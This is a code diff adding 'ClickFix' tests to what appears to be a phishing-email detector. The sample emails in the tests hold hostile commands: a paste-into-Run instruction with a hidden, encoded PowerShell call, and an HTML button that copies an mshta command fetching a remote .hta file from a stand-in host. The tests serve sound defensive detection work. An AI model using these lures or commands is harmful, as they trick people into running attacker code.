@@ -64,3 +64,23 @@ describe('consent and device-code lures', () => {
     expect(found.filter((id) => id === 'device-code-lure' || id === 'oauth-consent-link')).toEqual([]);
   });
 });
+
+describe('ClickFix', () => {
+  it('flags paste-a-command instructions', async () => {
+    const r = await analyzeRawEmail(mail(['From: a@b-verify.top', 'Subject: Verify you are human'], 'To finish verification: press Windows key + R, then Ctrl + V and Enter. This opens the Run dialog. powershell -w hidden -enc SQBFAFgA'));
+    expect(r.findings.find((f) => f.id === 'clickfix')?.severity).toBe('critical');
+  });
+
+  it('flags an HTML attachment that copies a command to the clipboard', async () => {
+    const page = '<button onclick="navigator.clipboard.writeText(\'mshta https://x.top/a.hta\')">I am not a robot</button>';
+    const raw = [
+      'From: a@b.top', 'Subject: Document', 'MIME-Version: 1.0', 'Content-Type: multipart/mixed; boundary="B"', '', '--B', 'Content-Type: text/plain', '', 'See attached.', '--B',
+      'Content-Type: text/html; name="doc.html"', 'Content-Disposition: attachment; filename="doc.html"', 'Content-Transfer-Encoding: base64', '', Buffer.from(page).toString('base64'), '--B--',
+    ].join('\r\n');
+    expect(await ids(raw)).toContain('clickfix-attachment-doc.html');
+  });
+
+  it('ignores normal keyboard tips', async () => {
+    expect(await ids(mail(['From: a@example.com', 'Subject: tips'], 'Tip: press Ctrl + V to paste text into the editor.'))).not.toContain('clickfix');
+  });
+});
